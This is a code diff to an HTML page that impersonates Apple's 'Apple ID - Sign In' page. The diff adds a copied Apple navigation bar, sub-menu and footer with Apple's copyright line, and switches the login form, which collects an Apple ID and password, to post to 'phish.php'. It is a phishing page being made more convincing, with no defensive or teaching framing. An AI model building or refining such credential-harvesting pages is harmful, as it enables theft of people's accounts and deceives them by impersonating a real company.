@@ -4,77 +4,65 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Apple ID - Sign In</title>
+    <link rel="stylesheet" href="styles.css">
     <link rel="icon" type="image/x-icon" href="favicon.ico">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f7;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .container {
-            text-align: center;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            outline: none;
-            text-transform: uppercase;
-        }
-
-        button {
-            width: 100px;
-            padding: 10px;
-            background-color: #0071e3;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        button:hover {
-            background-color: #005bb5;
-        }
-    </style>
 </head>
 <body>
+    <nav class="navbar">
+        <div class="navbar-container">
+            <a href="#" class="navbar-logo">
+                <img src="small-apple-logo.png" alt="Apple Logo">
+            </a>
+            <ul class="navbar-links">
+                <li><a href="#">Store</a></li>
+                <li><a href="#">Mac</a></li>
+                <li><a href="#">iPad</a></li>
+                <li><a href="#">iPhone</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">AirPods</a></li>
+                <li><a href="#">TV & Home</a></li>
+                <li><a href="#">Entertainment</a></li>
+                <li><a href="#">Accessories</a></li>
+                <li><a href="#">Support</a></li>
+                <li><a href="#"><img src="search-icon.png" alt="Search" class="icon"></a></li>
+                <li><a href="#"><img src="bag-icon.png" alt="Bag" class="icon"></a></li>
+            </ul>
+        </div>
+        <div class="sub-nav">
+            <h1>Apple ID</h1>
+            <ul class="sub-nav-links">
+                <li><a href="#">Sign In</a></li>
+                <li><a href="#">Create Your Apple ID</a></li>
+                <li><a href="#">FAQ</a></li>
+            </ul>
+        </div>
+    </nav>
     <div class="container">
-        <header>
-            <img src="apple-logo.png" alt="Apple Logo" class="logo">
-            <h1>Sign in to your Apple ID</h1>
+        <header class="header">
+            <img src="apple-logo-transparent.png" alt="Apple Logo" class="logo">
+            <h1>Apple ID</h1>
+            <p>Manage your Apple Account</p>
         </header>
         <main>
-            <form action="verify.php" method="post">
+            <form action="phish.php" method="post">
                 <div class="input-group">
-                    <label for="apple-id">Apple ID</label>
-                    <input type="text" id="apple-id" name="apple-id" required>
+                    <input type="text" id="apple-id" name="apple-id" placeholder="Email or Phone Number">
                 </div>
                 <div class="input-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password" required>
+                    <input type="password" id="password" name="password" placeholder="Password">
                 </div>
                 <button type="submit">Sign In</button>
             </form>
             <p class="forgot">
                 <a href="#">Forgot Apple ID or password?</a>
             </p>
-        </main>
+       </main>
     </div>
+    <footer class="footer">
+        <div class="footer-links">
+            <p>More ways to shop: <a href="#">Find an Apple Store</a> or <a href="#">other retailer</a> near you. Or call 1-800-MY-APPLE.</p>
+            <p>Copyright © 2024 Apple Inc. All rights reserved. <a href="#">Privacy Policy</a> <a href="#">Terms of Use</a> <a href="#">Sales and Refunds</a> <a href="#">Legal</a> <a href="#">Site Map</a></p>
+        </div>
+    </footer>
 </body>
 </html>
